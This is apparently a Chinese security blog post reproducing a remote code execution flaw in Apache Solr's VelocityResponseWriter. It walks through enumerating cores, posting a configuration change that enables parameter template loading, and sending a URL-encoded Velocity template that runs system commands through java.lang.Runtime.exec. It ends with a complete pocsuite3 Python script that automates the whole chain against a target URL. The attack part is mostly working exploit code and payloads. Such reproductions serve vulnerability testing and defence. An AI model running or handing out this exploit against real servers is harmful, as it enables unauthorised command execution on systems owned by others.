---
title:  apache_solr_via_velocity_template_rce复现
date: 2019-10-31 14:13:03
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - solr
    - via_velocity_template
    - 漏洞复现
    - RCE
---
# 0x00 漏洞概述

Apache Solr 默认集成 VelocityResponseWriter 插件

该插件初始化参数中的 
`params.resource.loader.enabled` 
用来控制是否允许参数资源加载器在 `Solr` 请求参数中指定模版

该参数默认值是`False`，可以通过构造 POST 请求直接修改集合设置，

将`params.resource.loader.enabled `设置为` true`

然后构造GET请求来进行远程代码执行漏洞

# 0x01 影响范围

包括不限于最新版 8.2.0

# 0x02 漏洞复现
## 获取core name

访问Core Admin得到`core name`
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031161555.png)

有的没有`Core Admin`按钮
直接访问 `url/solr/admin/cores?wt=json&indexInfo=false`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031161914.png)

## 修改配置

访问   `url/solr/core name/config`  
查找 `solr.resource.loader.enabled` 是否为 `true`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031162555.png)

如果为false，构造post请求，修改

```
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163002.png)

## 漏洞利用

```
url/solr/core name/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163326.png)

# 0x03 POC
```
#! python3
"""

@FileName: apache_solr_via_velocity_template_rce.py
@Author: dylan
@software: PyCharm 
@Datetime: 2019-10-31 14:54

"""
import json
from abc import ABC

from pocsuite3.api import Output, POCBase, register_poc, requests, logger


def get_core_name(url):
    url += "/solr/admin/cores?wt=json&indexInfo=false"
    res = requests.get(url, verify=False, timeout=30)
    core_name = list(json.loads(res.text)["status"])[0]
    return core_name


def update_config(path):
    headers = {
        'User-Agent': "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; "
                      ".NET CLR 2.0.50727)",
        'Content-Type': 'application/json'
    }
    data = """
    {
        "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
    """
    res = requests.post(path, data=data, headers=headers, verify=False, timeout=30)
    return res


def send_payload(path, core_name, cmd):
    headers = {
        'User-Agent': "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; "
                      ".NET CLR 2.0.50727)"
    }
    payload = path + "/solr/" + core_name + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom" \
                                            "=%23set(" \
                                            "$x=%27%27)+%23set($rt=$x.class.forName(" \
                                            "%27java.lang.Runtime%27))+%23set(" \
                                            "$chr=$x.class.forName(%27java.lang.Character%27))+%23set(" \
                                            "$str=$x.class.forName(" \
                                            "%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(" \
                                            "%27" + cmd + "%27))+$ex.waitFor(" \
                                                          ")+%23set($out=$ex.getInputStream())+%23foreach($i+in+[" \
                                                          "1..$out.available(" \
                                                          ")])$str.valueOf($chr.toChars($out.read()))%23end"
    res = requests.get(payload, headers=headers, verify=False, timeout=30)
    return res


class DemoPOC(POCBase, ABC):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "3.0"  # 默认为1
    author = "dylan"  # PoC作者的大名
    vulDate = "2019/10/31"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019/10/31"  # 编写 PoC 的日期
    updateDate = "2019/10/31"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template"]  # 漏洞地址来源,0day不用写
    name = "apache_solr_via_velocity_template_rce"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "solr"  # 漏洞应用名称
    appVersion = "<8.2.0"  # 漏洞影响版本
    vulType = "RCE"  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = """
        
    """  # 漏洞简要描述
    samples = [""]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = """
    
    """

    def _verify(self):
        # 验证代码
        result = {}
        core_name = get_core_name(self.url)

        path = self.url + "/solr/" + core_name + "/config"
        res = requests.get(path, verify=False, timeout=30)
        if ('"solr.resource.loader.enabled":"true"' not in res.text) or (
                '"params.resource.loader.enabled":"true"' not in res.text):
            res = update_config(path)
            if res.status_code != 200:
                return self.parse_output(result)

        cmd = "echo hello"
        res = send_payload(self.url, core_name, cmd)
        # print(res.text)
        if res.status_code == 500:
            cmd = "whoami"
            res = send_payload(self.url, core_name, cmd)
            if res.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['whoami'] = res.text
        elif "hello" in res.text and "responseHeader" not in res.text:  # result是返回结果
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['echo hello'] = res.text
        return self.parse_output(result)

    def _attack(self):
        # 攻击代码
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Internet nothing returned")
        return output


# 注册 DemoPOC 类
register_poc(DemoPOC)

```


# 参考文章
[Apache_Solr_RCE_via_Velocity_template: Apache_Solr_RCE_via_Velocity_template](https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template)